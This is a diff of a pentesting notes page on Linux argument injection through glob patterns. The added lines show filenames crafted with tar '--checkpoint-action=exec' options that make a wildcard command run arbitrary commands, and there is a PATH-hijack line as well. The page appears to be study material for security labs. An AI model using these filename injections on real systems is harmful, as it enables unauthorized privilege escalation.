@@ -64,15 +64,15 @@ $ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
 
 ## Parameters injection  🎭
 
-[![linuxstrengthtraining](../../../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
 [![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
+[![linuxstrengthtraining](../../../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
+[![ultra_upload](../../../../_badges/rootme/realist/ultra_upload.svg)](https://www.root-me.org/en/Challenges/Cracking/Godot-Mono)
 
 <div class="row row-cols-lg-2"><div>
 
 We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced, e.g., by creating file named after the command arguments.
 
 To execute any command manipulating a filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.
-</div><div>
 
 For instance, to inject `-la` into `ls *`:
 
@@ -86,7 +86,16 @@ drwxr-xr-x 2 xxx xxx 4096 Apr 29 18:50 .
 drwxr-xr-x 9 xxx xxx 4096 Apr 29 18:50 ..
 -rw-r--r-- 1 xxx xxx    0 Apr 29 18:50 -la
 ```
+</div><div>
 
+While the `--` trick is handy, it may not always work. You can alternatively use the relative path:
+
+```shell!
+$ touch './--checkpoint=1'
+$ touch './--checkpoint-action=exec="id > id.txt"'
+$ touch './--checkpoint-action=exec=id > id.txt'
+$ touch './--checkpoint-action=exec=bash script.sh'
+```
 </div></div>
 
 <hr class="sep-both">
